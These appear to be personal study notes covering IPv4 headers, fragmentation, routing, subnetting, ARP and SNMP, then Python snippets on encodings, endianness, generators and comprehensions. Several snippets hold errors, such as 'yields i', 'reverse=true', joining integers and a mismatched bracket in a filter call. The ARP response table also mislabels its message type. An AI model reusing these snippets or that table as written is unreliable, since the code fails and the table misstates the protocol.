     + a *packet* will always be inspected when it arrives a system(including a router) along the delivery path. If corruption or any transient errors is detected, the packet will be destroyed immediately. If a semi-permanent problem, e.g., no rounting table entry for the next destination network is found, is dectected, the IP may also use the Internet Control Message Protocol(ICMP) to return the error message back to the original sender.
     + ? header checksum: Q: on each packet or each datagram?

**** header checksums(the checksum *for the IP header* in the IP header)
     + in every package header, for the header itself, not for the body
     #+begin_quote
     Every device that receives an IP datagram must examine the IP header and compare that information with the value stored in the header's checksum field.
     The data portion ... is not verified, for three reasons:
     #+end_quote
       1. for efficiency.
       2. the data portion always consists of a higher-level datagram, e.g., TCP/UDP. Since those portocol might also provide error-checking routines, the data portions might be examed later anyway.
       3. not all but some high level applications might be able to work with corrupted data, discard those then might be disservice
          
**** time-to-live
     + the time-to-live field in the IP header.
       #+begin_quote
       Every system that forwards the packet decreases the value of the Time-to-Live field by one, before sending the datagram on. If the Time-To-Live value reaches zero before the datagram gets to its final destination, then the gacket is destroyed.
       The purpose of the Time-to-Live field is to keep datagrams that are caught in an undeliverable loop from tying up network resources. ... This safeguard prevents routing loops from causing network meltdowns.
       ...
       The strict definition of the Time-to-Live field states that the value is a measure of time in seconds, or any forwarding act that took less than one second to perform. However, there are very few Internet routers that require a full second to perform forwarding, so this definition is somewhat misrepresentative. In actual practice, the Time-to-Live value is decremented for every hop, regardless of the actual time required to forward a datagram from one network segment to another.
       #+end_quote
       
     + the default
       #+begin_quote
       The default value for the Time-to-Live field should be set to 64 according to the Assigned Numbers registry([[http://www.iana.org/][IANA]]). In addition, some of the higher-layer protocols also have default Time-to-Live values that they are supposed to use(e.g., 64 for TCP, and 1 for IGMP). These values are really only suggestions, ... .
       #+end_quote
       
**** fragmentation and reassembly
     + Maximum Transmission Unit(MTU): the maximum bytes in a single frame.
       #+begin_quote
       Ethernet can pass only 1500 bytes in a single frame, while the typical MTU for 16-Mb/s Token Ring is 17,914 bytes per frame.
       RFC 791 specifies that the maximum allowed MTU size is 65,535 bytes, and that the minimum allowed MTU size is 68 bytes. 
       #+end_quote
     + if datagram > maximum 8 byte alignment to MTU, need to be fragmentated. For example, a 4464-byte datagram(20 bytes header + 4444 bytes data) senting to a network where MTU = 1500, will be fragmented to (20 bytes header + 1480 data)*3 + (20 bytes header + 4 bytes data)*1.
     + in the header:
       - 16-bit Fragment Identifier(like a very short uuid), same for all fragments of a datagram.
       - the Fragmentation Offset, counting by the No.s of 8 bytes blocks.
       - 3-bit Flags field: Reserved(must be marked 0), (the packet) May be further Fragmented Flag(0 if possible), More Fragments(0 if no more)
     + the IP software find the first packet whose fragment offset field is 0, and find the last packet whose More Fragments flag is 0, and assemble the rest in order, once all of the segments arrives.
       
**** prioritization and service-based routing
     + 8-bit type of service(TOS) field, or the TOS byte
       - 3-bit(0-7) precedence field marking prioritization (8 levels of prioritization)
         | Precedence | Definition           |
         |------------+----------------------|
         |          0 | Routine(normal)      |
         |          1 | Priority             |
         |          2 | Immediate            |
         |          3 | Flash                |
         |          4 | Flash Override       |
         |          5 | Critical             |
         |          6 | Internetwork Control |
         |          7 | Network Control      |

       - 4-bit(0-15) the Type-of-Service value predefined by IANA, in RFC 1349.
         | Value | Service               |                        |
         |-------+-----------------------+------------------------|
         |     0 | Normal                | all flags off          |
         |     1 | Minimize Cost         |                        |
         |     2 | Maximize Realiability |                        |
         |     4 | Maximize Throughput   | 1 for high throughput  |
         |     8 | Minimize Delay        | 1 for low delay        |
         |    15 | Maximize Security     | RFC 1455, experimental |

       - the IANA also published suggested TOS values for common application protocols.
         
     + there values are more respected in unix/linux environment.

     + in conjunction with TOS-aware router, it is possible to provide deterministic routing service across the managed network, provide different routing depending on the needs of each packet.

*** the IP Header
    #+begin_quote
    An IP datagram is made up of at least thirteen fields, with twelve fields being used for the IP header, and one field being used for data. In addition, there are also a variety of supplemental fields that may show up as “options” in the header. The total size of the datagram will vary according to the size of the data and the options in use.
    #+end_quote

**** the mandatory fields
     | Field                  |   Bits | Notes                                                         |
     |------------------------+--------+---------------------------------------------------------------|
     | Version                |      4 | IPv4/v6                                                       |
     | Header Length          |      4 | in 32-bit multiples, 20 bytes = 5 * 32/8bits                  |
     | ToS Flags              |      8 | type of service flags                                         |
     | Total Packet Length    |     16 | length of (header + body), in bytes                           |
     | Fragment Identifier    |     16 | Identifier of a datagram                                      |
     | Fragmentation Offset   |     13 | in 8 bytes, the start position of this fragment               |
     | Time-to-Live           |      8 | the remaining hops a datagram can take                        |
     | Protocol Identifier    |      8 | Identifies the higher-layer protocol used in the data section |
     | Header Checksum        |     16 | checksum of the IP header                                     |
     | Source IP Address      |     32 | the 32-bit IP address of the original sender                  |
     | Destination IP Address |     32 | the 32-bit IP address of the final destination                |
     | Options(optional)      | varies | cache specific data if ToC Source Routing or Timestamp, etc.  |
     | Padding(if required)   | varies | an IP datagram header must be a multiple of 32 bits long.     |
     | Data                   | varies | Normally could contain a complete TCP/UDP message,            |
     |                        |        | although it could also be a fragment of another IP datagram.  |

     + header length: used to determine where the data portion start. minum value: 5.
     + [[http://www.isi.edu/in-notes/iana/assignments/protocol-numbers][protocol identifier]]
       | Protocol ID | Protocol Type                            |
       |-------------+------------------------------------------|
       |           1 | Internet Control Message Protocol(ICMP)  |
       |           2 | Internet Group Management Protocol(IGMP) |
       |           6 | Transmission Control Protocol(TCP)       |
       |          17 | User Datagram Protocol(UDP)              |
     + header checksum: must be modified every time the packet forwarded across a router(since at least TTL will change)
     + ip options: 
       #+begin_quote
       Options are not mandatory, and most IP datagrams do not have any options defined. However, all network devices should support the use of options. If a device does not recognize a specific option type, then it should ignore the option and go ahead and process the datagram as normal.
       ...
       There can be many options in a single IP datagram, up to the amount of free space available in the IP header. Since an IP header can only be 60 bytes long at most—and since 20 bytes are already in use by the default fields—only 40 bytes are available for options.
       #+end_quote
       - option-type (8 bits) [[http://www.isi.edu/in-notes/iana/assignments/ip-parameters][most commonly used ip option types (IANA)]]
         + copy(1 bit): should be copy to every fragment's header.
         + class(2 bits): 0 for network control options, 2 for debugging services, 1 & 3 reserved for future use.
         + type(5 bits): specify which ip option
       - option-length (8 bits)
       - option-data (varies)
         
*** IP in Action, basic routing table
    |    Destination |         Netmask |       Gateway |     Interface |
    |----------------+-----------------+---------------+---------------|
    |        0.0.0.0 |         0.0.0.0 |  192.168.10.3 | 192.168.10.10 |
    |      127.0.0.0 |       255.0.0.0 |     127.0.0.1 |     127.0.0.1 |
    |   192.168.10.0 |   255.255.255.0 | 192.168.10.10 | 192.168.10.10 |
    | 192.168.10.255 | 255.255.255.255 | 192.168.10.10 | 192.168.10.10 | 
    |                |                 |               |               |
    
    + 0.0.0.0 the default route for this device 
    + 192.168.10.255 broadcast address for the local network
    + in each network the device should have an unique ip address(assigned to the interface): in this case, the system is connected to a loopback network(this machine) and a local Ethernet network.
    + 127.0.0.0 vs 127.0.0.1:
      #+begin_quote
      the 127.0.0.0 is a network address. Together with mask 255.0.0.0 it gives you a hint that ... 127.*.*.* will contain loopback addresses.
      the 127.0.0.1 is a loopback address, so does 127.0.0.2 or 127.0.0.3 and etc.
      #+end_quote
      
**** subnet mask and multicast address
    + 172.16.0.0/12:
      | Note |                            Binary form |    Dot-decimal |
      |------+----------------------------------------+----------------|
      |    1 | 10101100.0001 *0000.00000000.00000000* |     172.16.0.0 |
      |    2 |    11111111.11110000.00000000.00000000 |    255.240.0.0 |
      |    3 |    00000000.00001111.11111111.11111111 |   0.15.255.255 |
      |    4 |    10101100.00011111.11111111.11111111 | 172.31.255.255 |

      1. the ip address
      2. Subnet Mask
      3. Bit Complement(Bitwise NOT) of the Subnet Mask
      4. Broadcast address(Bitwise OR of 1 and 3)
         
    + special case:
      #+begin_quote
      255.255.255.255 is the broadcast address of the zero network or 0.0.0.0, which in Internet Protocol stands for *this network*, i.e. the local network. Transmission to this address is limited by definition, in that it is never forwarded by the routers connecting the local network to other networks.
      #+end_quote

**** possible routing problem and debugging
    1. the pinciple: 
      - ip devices try to connect each other directly whenever possible, and use route when direct connection is not possible.
      #+begin_quote
      Since IP is designed as a node-centric networking protocol, every device has equal access to the network. In this model, any device can communicate with any other device directly, without requiring the services of a centralized host. Nodes do not send traffic to a central host for processing and relay services, but instead communicate directly with the destination system, if possible.

      When this is not possible—such as when the two hosts are on separate networks—then the sending device has to locate another device to relay the traffic to the destination system on its behalf. Even in this situation the sending device is still self-deterministic, since it chooses which local device it will send the datagrams to for forwarding.

      The process of choosing an intermediate forwarding device is called routing. Whenever a device needs to choose a forwarder, it looks at a local list of available networks and forwarders (called the “routing table”), and decides which interface and forwarder is the most appropriate for the specific datagram that needs to be sent.
      #+end_quote

      - fragmentation problem might be detected by sending large size ICMP datagram using ping.
     
      - use the ICMP protocol to debug, since almost all problems are related with delivery difficulties.
        #+begin_quote
        Since IP provides only simple delivery services, almost all of the problems with IP are related to delivery difficulties. Perhaps a network segment is down, or a router has been misconfigured, or a host is no longer accepting packets.

        In order to effectively debug problems with IP delivery, you should rely on the ICMP protocol. It is the function of ICMP to report on problems that will keep IP datagrams from getting delivered to their destination effectively. 
        #+end_quote
    2. routing table misconfigured
       - traceroute
    3. media related issues
       - possible infractructure problem
       #+begin_quote
       Since IP packets are sent inside of media-specific frames, there can be problems with some network media that will manifest when used with IP packets. For example, some network managers have reported problems with network infrastructure equipment such as Ethernet hubs and switches that have problems dealing with full-sized (1500-byte) packets. In those situations, you will need to use ICMP to probe the network for delivery problems through equipment that is acting suspicious.
       #+end_quote
  
**** ?Q: ARP and peers on an VPN
     + ?(lack reference)dial-up vs VPN:
       - dial-up use telephone line, but I think they share a similar topology(packet switching), i.e. client-server-Internet
       - while all IP devices are treated as independence entities, both dial-up and VPN delegate ip communication with the Internet to a "server".

     + ?(lack reference)peers on VPN
       - if any communication between clients may happen, it should be after they dial in to the VPN server.
       - so potential arp attack might happen only if the clients are sharing an environment which is behind the VPN server(a shared lab, for example.) A client may send ARP through a shared lab machine. (detail?)
       - ? other angle on the VPN server?


* Book4_Chapter 03 The Address Resolution Protocol
  #+begin_quote
  In order for IP systems to communicate with each other, they must first be able to identify the hardware addresses of the other devices on the same network segment that the local device is on. This service is provided by the Address Resolution Protocol.
  #+end_quote

** the ARP standard
  #+begin_quote
  ARP packets communicate with the data-link layer directly, the same as IP packets. As such, ARP packets are completely separate from IP packets; they even have a different protocol ID of 0806, instead of 0800 as used with IP.
  #+end_quote

  + fields of an ARP packet
| field No. | field detail                                                    |
|-----------+-----------------------------------------------------------------|
| 1         | the hardware address of the sources(who issued the ARP request) |
| 2         | the IP address of the source                                    |
| 3         | the hardware address of the destination                         |
| 4         | the IP address of the destination                               |
| 5         | the "message type" of this ARP packet                           |

  + a normal packet of ARP request :
  | field No. | field detail                         |
  |-----------+--------------------------------------|
  | 1         | the hardware address of the "sender" |
  | 2         | the IP address of the "sender"       |
  | 3         | 000...0                              |
  | 4         | the IP address of the "target"       |
  | 5         | "ARP request"                        |

  + a normal packet of ARP response:
| field No. | field detail                         |
|-----------+--------------------------------------|
| 1         | the hardware address of the "sender" |
| 2         | the IP address of the "sender"       |
| 3         | the hardware address of the "target" |
| 4         | the IP address of the "target"       |
| 5         | "ARP request"                        |
    
 + since ARP has no timeout, in some implementations when a new packet come to the queue and ask for an ARP request for an IP address, whose last ARP request is yet to be received, then the former packet which required the last ARP request may be dropped, depend on the implementation.
   #+begin_quote
   Many implementations only have room in the ARP lookup queue for a single packet for each of the hosts being queried. If an ARP request is not satisfied and another packet arrives from IP for the host being queried, then the first query will likely be aborted, and a second query will be issued. 
   #+end_quote

*** the ARP Cache
   #+begin_quote
   When the requesting system gets an ARP response, it will store the hardware and IP address pair of the requested device into a local cache. The next time that system needs to send data, it will check the local cache, and if an entry is found it will go ahead and use it, eliminating the need to broadcast another request.

   Likewise, the system that responded to the ARP broadcast will store the hardware and IP addresses of the system that sent the original broadcast. If it did not do so, it would have to issue an ARP broadcast to find out where to send the ARP response.

   Since all of the systems on the network will see the ARP broadcast, they could go ahead and capture the IP and hardware addresses of the sender, storing this information in their own caches. However, doing this might cause existing entries in the cache to be flushed (an especially problematic issue with systems that have small caches), so *only those systems who already have the sender’s IP address in their cache should update their entries*. Hosts that do not already have the device in their cache should ignore the broadcast.
   #+end_quote

   + potential issues:
     - cache size issue
     - cache timeout issue: If lifespan too long, old cache still in effect on some host, so that package of newly assigned ip went wrongly to old machines; Else, lifespan too short, the network is flooded with ARP broadcast.
     #+begin_quote
     RFC826: (Did not suggest a specific timeout value, but do state that) if a device sees an ARP packet whose IP address is already in the cache, then any timeout clocks for that entry should be reset. This helps the already-cached data to survive for as long as possible.
     #+end_quote
     - static caching
*** Proxy ARP p102

* Book4_Related Other Protocals
** Simple Network Management Protocol(SNMP)
*** the basic
   + the info structure:
     - Object Identifier (OID) 
     - Management Information Base (MIB tree)
   + versions:
     - 1: auth with community string, no encryption.
     - 2c: feature rich, auth with community string, no encryption.
     - 3: auth, encryption with des, maybe aes depend on devices
   + tools: 
     - prtg: ~snmp-server view/group/user ?~
   + info:
     - SNMP Object Navigator, the MIB tree.

*** v3 attributes:
    + view: what can a user see
    + group: security policies
    + user: auth + data encryption key
    


* S2 python#utilities
** char, string processing (python)
*** TODO string formating

*** ~split~, ~join~
    #+begin_src
    l=[1,2]
    s = ' - '.join(l)
    l2 = s.split(' - ')
    #+end_src

*** encoding and decoding in python
   [[ut#EncodeDecodeAFile.py]]
   + ~str("こ").encode("utf-8")~ //<class 'bytes'> b'\xe3\x81\x93' 
   + ~b'\xe3\x81\x93'.decode("utf-8")~ //<class 'str'> 'こ'

   + ~130 177 130 241 130 201 130 191 130 205~ //Shift-JIS str 'こんにちは'
   + ~chr(99)~ //'c'
   + ~hex(130) + hex(177) + hex(130) + hex(241)~ //"0x820xb10x820xf1"
   + ~b2 = b"\x82\xb1\x82\xf1"~ //b2.__class__ = <bytes>
   + ~(b2.decode("shift-jis")~ //"こん"

**** base64 encoding decoding in python
     #+begin_src
     import base64
     o1 = base64.b64encode(b'cat') # b'Y2F0'
     o2 = base64.b64decode(o1) # b'cat'
     #+end_src

**** @Deprecated: codecs
   + ~codecs.encode(bytes('こんにちは', 'shift-jis'), encoding="base64")~ //b'grGC8YLJgr+CzQ==\n'
   + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64")~ //b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd'
   + ~codecs.decode(b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd', encoding="shift-jis")~ //こんにちは
   + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64").decode("shift-jis")~ //こんにちは

**** *Endianness* the Big-endian(BE) and Little-endian(LE)
     + BE: *the most significant byte -> smallest memory address.*
       - //left to right human readable? but reverse
       - an 32-bit int: 0x0A0B0C0D
         + (assume byte p* is the starting byte of a memory section)
         + 0A -> p
         + 0B -> p + 1
         + 0C -> p + 2
         + 0D -> p + 3
     + LE: *the most significant byte -> biggest memory address.*
       - //a bigger byte goes to a bigger address
       - an 32-bit int: 0x0A0B0C0D
         + (assume byte p* is the starting byte of a memory section)
         + 0D -> p
         + 0C -> p + 1
         + 0B -> p + 2
         + 0A -> p + 3

***** Endianness in python
      #+begin_src
      an_int = 5
      two_bytes_big = an_int.to_bytes(2,'big') # b'\x00\x05'
      two_bytes_little = an_int.to_bytes(2,'little') # b'\x05\x00'
      #+end_src

** data utilities
*** sort
    #+begin_src
    class C:
        def __init__(self, name, attr1, attr2):
            self.name = name
            self.attr1 = attr1
            self.attr2 = attr2 

    e1 = C('n', 1, 100)
    e3 = C('n', 3, 103)
    e2 = C('y', 2, 102)
    l = [e1, e3, e2]
    s_l = sorted(l, key=lambda e: e.attr1)
    s_l = sorted(l, key=attrgetter('name'), reverse=true)
    #+end_src

** network utilities (python)
*** socket
    + //socket(type, semantics)

** misc utilities
*** timer
    + basic usage
      #+begin_src python
      import time
      t1 = time.perf_counter() # monotonic, high resolution, os-wide global(including time elapsed during sleep)
      t2 = time.perf_counter()
      print(t2 - t1)
      #+end_src
    + ~time.get_clock_info('monotonic' || 'perf_counter' || 'process_time' || 'thread_time' || 'time')~ //show info of each clock in detail
      - monotonic means a clock never go backwards, and is not affected by system clock updates.

* S2 python#scripting
** basic
    + ~python -m module argv[]~
    + ~dir(); help()~
      #+begin_src
      import json
      dir(json); help(dir); help(json);
      #+end_src

*** pipenv
    + ~pipenv shell~
    + ~pip -V~ //the version & path of the pip, which reveals the env path.
    + ~exit~
    + ~pipenv run python~

** useful syntax
  + ~list(range(1,3))~ //[1, 2]
  + ~a, *b, _ = (1, 2, 3, 4)~ // *b = [2, 3]
  + ~setattr(obj, key, value); getattr(obj, key); hasattr(obj, key); delattr(obj, key)~
    #+begin_src
    class C:
        a = 0
    
    c = C()
    k = 'k1'
    setattr(c, k, 'v'); # c.k1 === 'v'
    kn = '1' # attribute name must be string
    setattr(c, kn, 3); # //! c.1, start with number, invalid syntax
    getattr(c, '1'); # ok
    #+end_src
  + ~for k,v in dict.items()~
    #+begin_src
    d = {'k1': 1, 'k2': 2, 'k3': 3}
    for k,v in d.items():
        print(k, v)
    #+end_src

*** generator && <list | dictionary | set> comprehension
    + // *basic generator*:
      #+begin_src python
      def basicGenerator ():
          for i in [1, 2, 3]:
              yields i

      gen = basicGenerator()
      next(gen)                # 1
      for e in gen:
          print(e)             # 2 3

      # //! next(gen)          # error  

      list(basicGenerator()) # fetch all results into a list 
      #+end_src

    + // *basic list comprehension*:
      - ~a_list = [x*x for x in [1, 2, 3]]~ // [1, 4, 9]

    + // *generator in list comprehension*:  
      #+begin_src python
      genLC = (i for i in [1, 2, 3])
      #+end_src
    
    + // *the nth element of a generator*:
      #+begin_src python
      from itertools import islice, count 
      iterable = (i for i in [1, 2, 3]) # a same generator
      start = 1 # -ge 0
      stop = None; # to the end

      x = islice(iterable, start, None) 
      # islice(iterable, start, None[, step]) 
      # Make an iterator that returns selected elements from the iterable. If start is non-zero, then elements from the iterable are skipped until start is reached.
      next(x) # 2
      next(x) # 3 
      #+end_src

    + // *advanced list comprehension*
      #+begin_src python
      l1 = map(lambda n: n*n, nums)
      l1 = [n*n for n in nums] # equivalent

      l2 = [n for n in nums if n%2 ==0]
      l2 = filter(lambda n: n%2 ==0, num]
      
      l3 = [(letter, num) for letter in 'abcd' for num in range(4)]
      #+end_src
    
    + // *dictionary comprehension*
      #+begin_src python
      names = ['Peter', 'Hank']
      heros = ['Batman', 'Whom']
      d1 = {name: hero for name, hero in zip (names, heros) if name != 'Peter'}
      # {'Hank': 'Whom'}
      #+end_src
    
    + // *set comprehension*
      #+begin_src python
      nums = [1, 1, 2]
      nums_set = { n for n in nums }
      #+end_src
